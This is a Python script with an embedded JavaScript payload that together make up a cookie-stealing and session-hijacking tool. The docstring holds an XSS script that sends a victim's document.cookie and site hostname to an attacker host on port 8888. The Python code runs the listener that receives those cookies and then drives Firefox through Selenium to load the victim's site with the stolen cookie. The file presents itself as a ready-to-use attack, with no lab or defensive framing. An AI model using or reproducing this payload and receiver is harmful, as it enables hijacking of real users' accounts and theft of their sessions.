"""
This sample code listens to tcp-port <attacker>@ 8888 for any incomming cookie.
Once it receives the cookie, it uses the cookie and opens firefox web browser.
Sample cookie stealing javascript,

<script>
function sendGetRequestWithCredentials() {
    var xhr = new XMLHttpRequest();
    var url = "http://<attacker>:8888/?cookie="+document.cookie+"&site="+window.location.hostname;
    xhr.open("GET", url, true);
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) { // 4 means the request is done
            if (xhr.status === 200) { // 200 means the request was successful
                // Log the response text to the console
                console.log("Response received: ", xhr.responseText);
            } else {
                // Log an error if the request failed
                console.error("Request failed with status: " + xhr.status);
            }
        }
    };
    xhr.send();
}
sendGetRequestWithCredentials();
</script>

"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import webbrowser
import http.cookiejar as cookielib
import urllib.request
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options


class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the URL
        parsed_url = urlparse(self.path)
                
        # Check if the request is for the favicon
        if (parsed_url.path == "/favicon.ico"):
        # Ignore the request (you can return or do nothing)
            return
        
        # Parse the query parameters
        query_params = parse_qs(parsed_url.query)
        
        
        # Check if there are any query parameters
        if not parsed_url.query:
        # No query parameters were received
            print ('No cookies received :( !')
            return  # You can return or handle this case as needed
        
        #print (query_params.items())
        
        ck = ''
        st = ''

        # Print all GET parameters
        print("Received GET parameters:")
        print ("------------------------------")
        for key, values in query_params.items():
            #print(key)
            #print(values)
            if (key == "cookie"):
                ck = values
                
            if (key == "site"):
                st = values
                
        print ("------------------------------")
        # Respond with the received parameters as a confirmation
        
        
        openWebPage(st , ck )
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        response = f"Received parameters: {query_params}".encode('utf-8')
        self.wfile.write(response)

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8888):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()
    
def openWebPage(ipaddrs , cookies ):
    print (ipaddrs[0])
    print (cookies[0])
    # Define the website URL and cookie value
    url = 'http://'+ipaddrs[0]
    cookie_name = 'Cookie'
    cookie_value = cookies[0]

    # URL of the site you want to open
    #url = "https://example.com"

    # Your cookie as a dictionary
    cookie = {
        'name':  cookie_name,
        'value': cookie_value,
        'domain': ipaddrs[0]  # Ensure the domain matches the site you're visiting
             }

    # Path to the WebDriver (e.g., geckodriver for Firefox)
    # Important : keep geckodriver.exe file in the OS PATH
    webdriver_path = "C:\\Python27\\geckodriver.exe"


    # Path to the Firefox binary (if not in default location)
    # Important : keep firefox.exe file in the OS PATH
    firefox_binary_path = "C:\\Program Files\\Mozilla Firefox\\firefox.exe"  # Update this to your actual Firefox binary path

    # Initialize the FirefoxOptions
    options = Options()
    options.binary_location = firefox_binary_path

    # Initialize the WebDriver using the Service class for Firefox
    service = Service(executable_path=webdriver_path)
    driver = webdriver.Firefox(service=service, options=options)


    # Open the site
    driver.get(url)

        # Add the cookie to the current session
    driver.add_cookie(cookie)

        # Refresh the page to apply the cookie
    driver.refresh()

    # The page is now open in the browser with the specified cookie

if __name__ == '__main__':
    run()
